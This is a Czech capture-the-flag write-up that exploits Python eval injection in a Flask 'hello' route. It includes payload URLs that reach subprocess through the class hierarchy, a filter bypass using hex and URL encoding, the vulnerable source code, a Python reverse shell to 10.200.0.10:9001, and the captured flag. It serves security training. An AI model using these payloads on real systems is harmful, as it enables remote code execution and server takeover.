# Streamlining portal NG(4)

## Zadání

Hi, packet inspector,

the AI has detected your previous breach and has improved the security measures. New streamlining portal is on <http://user-info-ng.mysterious-delivery.tcc>.

Your task is to break into the improved web and find again interesting information on the server.

May the Packet be with you!

## Nápovědy (Hints)

1\. Use VPN to get access to the web.

## Řešení

Tato úloha navazuje na [Streaming portal](../13_Streamlining_portal/README.md) a mělo by se jednat o její bezpečnější variantu. Zkusíme, co zůstalo.

---
Vylistování tříd

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__())+"`

Funguje.

---
Vylistování souborů

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('ls -al',shell=True,stdout=-1).communicate())+"`

Nefunguje 😒.

---
Verze Pythonu

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('python --version',shell=True,stdout=-1).communicate())+"`

Funguje `Python 3.10.6`.

---
Aktuální adresář

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('pwd',shell=True,stdout=-1).communicate())+"`

Funguje `/app`.

---
Zobrazení souboru projektu (odhadneme `app.py`)

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('cat app.py',shell=True,stdout=-1).communicate())+"`

Negunguje 😒.

---
Některé příkazy tedy můžeme spouštět, některé ne. Nejsou k dispozici příkazy `ls`, `cat` a další, které bychom rádi použili. Pro vylistování použijeme funkci pythonu `os.listdir()`.

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279].__init__.__globals__['sys'].modules['os'].listdir('.'))+"`

Funguje.

`Hello ['FLAG', '__pycache__', 'templates', 'app.py']`

---
Vylistujeme si adresář FLAG

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279].__init__.__globals__['sys'].modules['os'].listdir('FLAG'))+"`

Také funguje.

`Hello ['flag.txt']`

---
Zkusíme si zobrazit flag

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279].__init__.__globals__['__builtins__']['open']('FLAG/flag.txt').readlines())+"`

Nefunguje 😒

```text
Not Found

The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```

---
Zkusíme si zobrazit soubor `app.py`

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279].__init__.__globals__['__builtins__']['open']('app.py').readlines())+"`

Funguje

```python
from flask import Flask, Blueprint, redirect, render_template, abort

bp = Blueprint("app", __name__)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(bp, url_prefix="/")
    return app

@bp.route('/hello/<userstring>')
def hello(userstring):
    if 'cd ' in userstring:
       abort(403)
    message = eval('"Hello ' + userstring + '"')
    return render_template('index.html', message=message)

@bp.route('/')
def redirect_to_user():
    return redirect("/hello/user", code=302)
```

---
Pokud porovnáme tento zdrojový kód s kódem z předchozí úlohy, tak se liší v řádku `@bp.route('/hello/<userstring>')` a v zakázání příkazu `cd`. Nemůžeme tedy v python kódu použít lomítko `/`. Můžeme ho ale nahradit hexadecimální reprezentací `\x2f`. Zpětné lomítko také nemůžeme použít, to ale můžeme nahradit URL kódováním za `%5C`.

Dotaz tedy bude

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279].__init__.__globals__['__builtins__']['open']('FLAG%5cx2fflag.txt').read())+"`

nebo

`http://user-info-ng.mysterious-delivery.tcc/hello/"+open('FLAG%5cx2fflag.txt').read()+"`

Toto už funguje a získáme flag.

I zde je možné spustit reverse shell.

`http://user-info-ng.mysterious-delivery.tcc/hello/"+str([].__class__.__base__.__subclasses__()[279]('python -c %5c"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%5c'10.200.0.10%5c',9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(%5c'%5cx2fbin%5cx2fbash%5c')"',shell=True))+"`

V souboru [app.tar.gz](app.tar.gz) jsou stažené zdrojové soubory serveru.

## Flag

`FLAG{hvIM-3aty-R39h-dOZ4}`
